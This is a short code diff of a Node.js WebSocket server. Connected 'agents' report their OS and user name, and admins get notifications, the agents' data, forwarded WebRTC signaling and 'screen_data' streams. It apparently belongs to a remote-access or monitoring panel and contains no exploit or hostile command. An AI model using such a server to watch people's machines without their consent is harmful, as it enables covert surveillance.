@@ -37,13 +37,20 @@ wss.on('connection', (ws) => {
             // If it's an agent reporting in
             if (data.type === 'info') {
                 clients[id].info = data;
+                clients[id].lastSeen = Date.now();
+                
+                // Notify all admins about the new user
                 notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
+                
+                // ALSO broadcast the info directly to admins so they appear in the grid immediately
+                // This ensures the frontend 'users' object gets updated via the 'info' type handler
+                broadcastToAdmin(id, data); 
             } 
             // Forward signaling data (Offer/Answer/Candidate) between users
             else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                 forwardToTarget(id, data);
             }
-            // General data broadcast
+            // General data broadcast (e.g., screen_data, ping)
             else {
                 broadcastToAdmin(id, data);
             }
